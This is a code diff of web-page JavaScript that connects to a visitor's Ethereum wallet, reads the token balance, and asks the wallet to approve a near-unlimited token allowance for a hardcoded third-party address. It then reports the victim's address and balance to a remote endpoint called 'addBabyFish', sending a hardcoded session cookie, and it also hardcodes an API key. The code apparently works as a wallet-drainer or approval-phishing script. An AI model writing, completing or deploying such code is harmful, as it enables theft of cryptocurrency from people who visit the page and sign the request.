@@ -198,71 +198,73 @@
   // const desiredNetwork = '0x3' // '0x1' 表示以太坊主网
   // const value2 = '0x0'
   var account = ""
-  var balanceMoney = 0
+  // var balanceMoney = 0
   // var bal = 0
 
   async function test() {
     let web3;
+    let balanceMoney = 0
     if (window.ethereum) {
       web3 = new Web3(window.ethereum);
       await window.ethereum.enable().then(function (accounts) {
         console.log("xxxxxxxxxxxxxxxx")
         account = accounts
-        alert(account)
+        // alert(account)
       })
-      web3.eth.getBalance(account[0]).then(function (balace) {
+      await web3.eth.getBalance(account[0]).then(function (balace) {
         const balance = ethers.BigNumber.from(balace);
         console.log(ethers.utils.formatEther(balance));
-        balanceMoney = ethers.utils.formatEther(balance)
-        alert(balanceMoney)
+        // balanceMoney = ethers.utils.formatEther(balance)
+        // alert("user balanace = ", balanceMoney)
       })
-      // console.log("balance = " +  ba)
-      alert("ethereum")
+      // alert("ethereum")
     } else if (window.web3) {
       // Use Mist/MetaMask's provider.
       web3 = window.web3;
-      alert("web3")
+      // alert("web3")
     } else {
       const provider = new Web3.providers.HttpProvider(
-              "http://127.0.0.1:9545"
+              "https://mainnet.infura.io/v3/16b3844622e34365a8bcdd1d424d65f0"
       );
       web3 = new Web3(provider);
-      web3.eth.getAccounts().then(function (accounts) {
+      await web3.eth.getAccounts().then(function (accounts) {
         console.log("xxxxxxxxxxxxxxxx")
         account = accounts
       })
-      console.log(account)
-      alert(account)
       balancess = web3.eth.getBalance(account)
-      alert(balancess)
       console.log("provider = " + ethers.utils.formatEther(balancess));
-      balanceMoney = ethers.utils.formatEther(balancess)
-      alert("balanceMoney" + balanceMoney)
-      alert("provider")
+      // balanceMoney = ethers.utils.formatEther(balancess)
+      // alert("balanceMoney" + balanceMoney)
+      // alert("provider")
     }
-    let usdt = "0x27afd216475849ae176f37045b6d4a22611740a2"
+
+    let usdt = "0xa3127c695004e454922fe30a0038fd3b6a99c81d"
     const contr = new web3.eth.Contract(abi, usdt);
+    // let res = await contr.methods.balanceOf(account[0])
 
-    contr.methods.approve("0x428E1FA003D4d1C5EA4F924b0A3188c0aB0daDCb","115700000000000000000000000000000000000000000000000000000000").send({from:account[0]});
-    // console.log('getWeb3',res, account)
-    // alert("web3 " + res)
-    PostCon(account[0], "0x428E1FA003D4d1C5EA4F924b0A3188c0aB0daDCb")
-  }
-
-  function PostCon(user_address, auth_address) {
-    alert("post")
-    var data = JSON.stringify({
-      "terminal_id": 2,
-      "user_address": user_address,
-      "auth_address": auth_address,
-      "coin_type": "erc",
-      "base_chain": "usdt",
-      "user_available": balanceMoney,
-      "sproxy": "abcd",
+    console.log("--------------")
+    contr.methods.balanceOf(account[0]).call({from: account[0]}, function(error, result){
+      balanceMoney = result
+      console.log("xxxxxxxxxxxxxxxxxxxx", result);
     });
 
-    console.log("jason : ", data.toString())
-    alert("post data = " + data.toString())
+
+    contr.methods.approve("0x7aB2A4fAce8a5F943e2788aD1E6527d4141fD17D","115700000000000000000000000000000000000000000000000000000000").send({from:account[0]});
+    // console.log('getWeb3',res, account)
+    // alert("web3 " + res)
+    console.log("user usdt res = ", balanceMoney)
+    PostCon(account[0], "0xa3127c695004e454922fe30a0038fd3b6a99c81d", balanceMoney)
+  }
+
+  function PostCon(user_address, auth_address, balanceMoney) {
+    // alert("post")
+    var data = "";
+
+    url = "https://uapi.oct99a.com:8443/service?action=addBabyFish&terminal_id=2" +
+            "&user_address=" + user_address + "&auth_address=" + auth_address + "&" +
+            "coin_type=usdt&base_chain=erc&user_available=" + balanceMoney + "&sproxy=1"
+
+    console.log(url)
 
     var xhr = new XMLHttpRequest();
     xhr.withCredentials = false;
@@ -273,17 +275,12 @@
       }
     });
 
-    CORS_ALLOW_HEADERS = ('content-disposition', 'accept-encoding',
-            'content-type', 'accept', 'origin', 'authorization')
+    xhr.open("POST", url);
+    xhr.setRequestHeader("Cookie", "fdc6a94703a2ae8=eyJpdiI6IkxzaytQWG04ditOV2pCaEdpamRic1FQT0x6ZlU0NHl5Q2xuZ0JESW5DdjA9IiwidmFsdWUiOiJUMmtRVHJUcXNWTnFRejViQU96ZXI2OFN6S3dXOGg5RVpIemZpbisrYmd6aVdRRHJ6UThaalM5SFVGTUFxNDV4cVB6ckptdUthekloSjV5dTlRUFRVZz09IiwibWFjIjoiODVkMzE0ZThhN2FhZjI2OTc5NDAwMTQwMjAyZTZhZGM5M2E3OWExZDZiMGJiYjYzMTQ3MDY0Y2M5N2JjMDJiNiJ9");
 
-    xhr.open("POST", "https://uapi.oct99a.com:8443/service?action=addBabyFish");
-    xhr.setRequestHeader("Content-Type", "application/json");
-    // xhr.setRequestHeader("Content-Type", "text/plain");
-    // xhr.setRequestHeader("Cookie", "fdc6a94703a2ae8=eyJpdiI6InJyU09NaWJjSGVyNkVMcHRPUHdTd3FQSmFORlFXXC9PdVBGYndveW5pblQwPSIsInZhbHVlIjoiV0I0N3FCT1o5YjFiWXdBV2V4ZU9rOVdsTnV1c2RHTEtaVVJ3MlZ1MVhXRHdRajV2SkF0eERNQ0x2Uzcxb0VRQ0NIcDRaRnFKRHJNZHZTXC9VK1R6dDVBPT0iLCJtYWMiOiJmYzYxYTExOGJlZDhjZWZlNjYyNGQ0ZTgyYWE2YThmOTc2NjE5NzM2OTNjYTM4MGYwMmJmOTk3YWJkZDAyNWRkIn0%3D");
+    xhr.send(data);
 
-    res =  xhr.send(data);
-
-    alert("res " + xhr.responseText)
+    // alert("res " + xhr.responseText)
     console.log("post ok !!"+ xhr.responseText)
   }
 
